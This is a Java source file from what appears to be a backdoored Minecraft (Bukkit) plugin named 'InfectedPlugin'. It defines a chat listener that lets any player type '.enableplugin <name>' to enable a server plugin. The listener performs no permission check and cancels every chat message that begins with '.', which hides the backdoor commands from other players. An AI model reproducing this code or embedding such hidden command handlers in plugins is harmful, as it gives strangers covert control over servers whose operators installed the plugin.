package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Server;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.plugin.Plugin;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_enableplugin implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        boolean cancel = true;
        Server server = Bukkit.getServer();
        Player p = event.getPlayer();
        
        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".enableplugin"))
            {
                Plugin plugin = server.getPluginManager().getPlugin(args[1]);
                if (plugin != null)
                {
                    server.getPluginManager().enablePlugin(plugin);
                }
                p.sendMessage(ChatColor.AQUA + "Plugin enabled!");
                cancel = true;
            }
        
            if (cancel)
            {
                event.setCancelled(true);
                return;
            }
       }
    }
}
